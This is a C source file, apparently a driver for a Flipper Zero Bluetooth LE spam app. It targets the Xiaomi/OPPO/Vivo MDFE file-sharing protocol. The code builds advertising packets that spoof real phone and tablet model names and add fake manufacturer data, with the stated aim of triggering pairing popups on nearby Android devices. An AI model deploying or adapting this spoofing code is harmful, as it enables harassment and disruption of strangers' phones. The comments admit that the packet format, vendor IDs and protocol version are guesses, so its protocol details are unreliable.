#include "ble_spam.h"
#include <furi_hal_random.h>
#include <string.h>

// =============================================================================
// MDFE (互傳聯盟 / Mobile Direct Fast Exchange) 協議
// =============================================================================
// 「移動點對點快速傳輸協議」由小米、OPPO、Vivo 於 2019 年共同制定
// 基於 BLE 廣播發現 + Wi-Fi Direct 傳輸
//
// 協議特點:
// - 使用 BLE 4.0 廣播進行設備發現
// - 設備之間可以直接發現對方並建立連接
// - 傳輸使用 Wi-Fi Direct，速度可達 20MB/s
// - 支援設備: 小米、OPPO、Vivo、Realme、一加 (ColorOS/HarmonyOS)
//
// BLE 廣播格式 (理論):
// - Service UUID: 待確認 (各品牌可能有差異)
// - Manufacturer Data: 包含設備類型、協議版本等信息
// - Device Name: 設備名稱 (用戶自定義)
//
// 注意: 由於這是專有協議且未完全逆向，以下實現基於公開資料和合理猜測
// 實際效果可能需要根據真實設備測試調整
//
// 參考來源:
// - https://baike.baidu.com/item/vivo互傳/23410036
// - https://zhuanlan.zhihu.com/p/78808196
// =============================================================================

// =============================================================================
// MDFE 設備類型
// =============================================================================
typedef enum {
    MDFE_DeviceType_Phone = 0x01,
    MDFE_DeviceType_Tablet = 0x02,
    MDFE_DeviceType_PC = 0x03,
    MDFE_DeviceType_TV = 0x04,
} MDFEDeviceType;

// =============================================================================
// MDFE 廠商 ID
// =============================================================================
typedef enum {
    MDFE_Vendor_Xiaomi = 0x0001,
    MDFE_Vendor_OPPO = 0x0002,
    MDFE_Vendor_Vivo = 0x0003,
    MDFE_Vendor_Realme = 0x0004,
    MDFE_Vendor_OnePlus = 0x0005,
} MDFEVendor;

// =============================================================================
// MDFE 設備列表 (已確認支援的品牌和設備)
// =============================================================================
static const struct {
    const char* name;
    MDFEVendor vendor;
    MDFEDeviceType device_type;
    const char* device_category;
} g_mdfe_devices[] = {
    // ====== 小米 / Redmi / POCO ======
    {"Xiaomi 14 Ultra", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Xiaomi 14 Pro", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Xiaomi 13 Ultra", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Xiaomi 13 Pro", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Xiaomi 12 Pro", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Redmi K60 Pro", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Redmi Note 13 Pro+", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"POCO F5 Pro", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Xiaomi Pad 6", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Tablet, "Tablet"},
    {"Xiaomi Pad 5", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Tablet, "Tablet"},
    
    // ====== OPPO / Realme / OnePlus ======
    {"OPPO Find X7 Pro", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Find X6 Pro", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Reno 10 Pro+", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Reno 9 Pro+", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Find N3", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Find N2 Flip", MDFE_Vendor_OPPO, MDFE_DeviceType_Phone, "Phone"},
    {"OPPO Pad 2", MDFE_Vendor_OPPO, MDFE_DeviceType_Tablet, "Tablet"},
    {"realme GT5 Pro", MDFE_Vendor_Realme, MDFE_DeviceType_Phone, "Phone"},
    {"realme GT3", MDFE_Vendor_Realme, MDFE_DeviceType_Phone, "Phone"},
    {"realme 11 Pro+", MDFE_Vendor_Realme, MDFE_DeviceType_Phone, "Phone"},
    {"OnePlus 12", MDFE_Vendor_OnePlus, MDFE_DeviceType_Phone, "Phone"},
    {"OnePlus 11", MDFE_Vendor_OnePlus, MDFE_DeviceType_Phone, "Phone"},
    {"OnePlus Open", MDFE_Vendor_OnePlus, MDFE_DeviceType_Phone, "Phone"},
    
    // ====== Vivo / iQOO ======
    {"Vivo X100 Pro", MDFE_Vendor_Vivo, MDFE_DeviceType_Phone, "Phone"},
    {"Vivo X90 Pro+", MDFE_Vendor_Vivo, MDFE_DeviceType_Phone, "Phone"},
    {"Vivo X Fold 2", MDFE_Vendor_Vivo, MDFE_DeviceType_Phone, "Phone"},
    {"Vivo Pad 2", MDFE_Vendor_Vivo, MDFE_DeviceType_Tablet, "Tablet"},
    {"iQOO 12 Pro", MDFE_Vendor_Vivo, MDFE_DeviceType_Phone, "Phone"},
    {"iQOO 11 Pro", MDFE_Vendor_Vivo, MDFE_DeviceType_Phone, "Phone"},
    {"iQOO Pad", MDFE_Vendor_Vivo, MDFE_DeviceType_Tablet, "Tablet"},
    
    // ====== 其他品牌 (預設互通) ======
    {"Generic Android Phone", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Phone, "Phone"},
    {"Generic Android Tablet", MDFE_Vendor_Xiaomi, MDFE_DeviceType_Tablet, "Tablet"},
};

// =============================================================================
// MDFE 協議構建
// =============================================================================
// MDFE BLE 廣播格式 (猜測):
// AD Structure:
//   [Len] [Type=0xFF] [CompanyID] [ProtocolVer] [DeviceType] [VendorID] [Reserved...]
//
// 實際的 MDFE 可能使用以下其中一種方式:
// 1. 特定的 Service UUID (目前未知)
// 2. Manufacturer Data 包含設備信息
// 3. Device Name 包含特定前綴
//
// 這裡使用 Device Name 方式，因為它最容易被檢測到
// 大多數 Android 手機的「互傳」功能會掃描附近具有特定藍牙名稱的設備
// =============================================================================

static uint8_t mdfe_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    MDFECfg* cfg = &config->config.mdfe;
    
    // 選擇設備
    uint8_t device_idx;
    if(config->mode == AttackMode_Random || config->mode == AttackMode_Single) {
        device_idx = rand() % (sizeof(g_mdfe_devices) / sizeof(g_mdfe_devices[0]));
    } else {
        device_idx = cfg->config.vendor_id;  // 使用配置的設備
    }
    
    const char* device_name = g_mdfe_devices[device_idx].name;
    MDFEVendor vendor = g_mdfe_devices[device_idx].vendor;
    MDFEDeviceType device_type = g_mdfe_devices[device_idx].device_type;
    
    // 構建 BLE 廣播數據包
    // 使用 Device Name AD structure (0x09)
    // 格式: [Len] [Type=0x09] [Name bytes...]
    
    size_t name_len = strlen(device_name);
    uint8_t total_size = 1 + 1 + name_len;  // Length + Type + Name
    
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    packet[i++] = total_size - 1;  // Length (不包括長度自己)
    packet[i++] = 0x09;             // AD Type: Complete Local Name
    memcpy(&packet[i], device_name, name_len);
    i += name_len;
    
    // 同時廣播一個 Manufacturer Data 結構來增加檢測機會
    // 這可以觸發一些手機的專有配對彈窗
    // Company ID 使用 0xFFFF 作為測試標識
    
    // 額外的 Manufacturer Data (可選)
    // 格式: [Len] [Type=0xFF] [Company=0xFF 0xFF] [ProtocolInfo...]
    uint8_t mfg_size = 1 + 2 + 4;  // Type + Company + Protocol Info
    uint8_t* mfg_packet = malloc(mfg_size);
    uint8_t j = 0;
    mfg_packet[j++] = mfg_size - 1;  // Length
    mfg_packet[j++] = 0xFF;           // AD Type: Manufacturer Specific
    mfg_packet[j++] = 0xFF;           // Company ID (test)
    mfg_packet[j++] = 0xFF;
    mfg_packet[j++] = 0x01;           // Protocol version (猜測)
    mfg_packet[j++] = (uint8_t)device_type;  // Device type
    mfg_packet[j++] = (uint8_t)vendor;       // Vendor ID
    
    // 合併兩個數據包
    uint8_t* combined = malloc(total_size + mfg_size);
    memcpy(combined, packet, total_size);
    memcpy(combined + total_size, mfg_packet, mfg_size);
    
    free(packet);
    free(mfg_packet);
    
    *_size = total_size + mfg_size;
    *_packet = combined;
    return total_size + mfg_size;
}

// =============================================================================
// 獲取設備名稱
// =============================================================================
static const char* mdfe_get_name(uint32_t index) {
    if(index >= sizeof(g_mdfe_devices) / sizeof(g_mdfe_devices[0])) {
        return "Unknown";
    }
    return g_mdfe_devices[index].name;
}

static uint32_t mdfe_get_count(void) {
    return sizeof(g_mdfe_devices) / sizeof(g_mdfe_devices[0]);
}

// =============================================================================
// 協議驅動
// =============================================================================
const ProtocolDriver g_protocol_mdfe = {
    .name = "MDFE (互傳聯盟)",
    .short_name = "MDFE",
    .is_active = true,
    .build_packet = mdfe_build_packet,
    .get_device_name = mdfe_get_name,
    .get_device_count = mdfe_get_count,
    .init = NULL,
    .deinit = NULL,
};